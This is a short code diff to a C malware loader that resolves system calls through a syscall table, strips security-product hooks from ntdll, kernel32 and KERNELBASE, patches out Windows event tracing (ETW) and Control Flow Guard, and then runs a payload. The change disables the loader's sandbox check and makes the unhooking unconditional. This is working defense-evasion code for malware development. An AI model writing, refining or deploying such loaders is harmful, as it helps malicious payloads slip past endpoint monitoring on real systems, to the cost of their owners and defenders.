@@ -146,7 +146,7 @@ void main() {
     // 1. 初始化 TEB/PEB
     PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
     PPEB pCurrentPeb = pCurrentTeb ? pCurrentTeb->ProcessEnvironmentBlock : NULL;
-    if (!CheckEnvironment()) return;
+    //if (!CheckEnvironment()) return;
 
     srand(GetTickCount());
     g_returnAddress = (PVOID)_AddressOfReturnAddress();
@@ -223,10 +223,11 @@ void main() {
     VX_TABLE Table = { 0 };
     if (!PopulateVxTable(g_ntdllBase, pImageExportDirectory, &Table)) return;
     // 6. 执行
-    BOOL bNeedsUnhooking = IsNtdllTainted(&Table);
-    if (bNeedsUnhooking) {
-        UnhookNtdll(&Table); 
-    }
+    //BOOL bNeedsUnhooking = IsNtdllTainted(&Table);
+    UnhookNtdll(&Table, L"KERNELBASE.dll", g_kernelBaseAddr);
+    UnhookNtdll(&Table, L"kernel32.dll", g_kernel32Base);
+    UnhookNtdll(&Table, L"ntdll.dll", g_ntdllBase);
+
     PatchEtw(&Table); 
     PatchCFG(&Table);
     Payload();
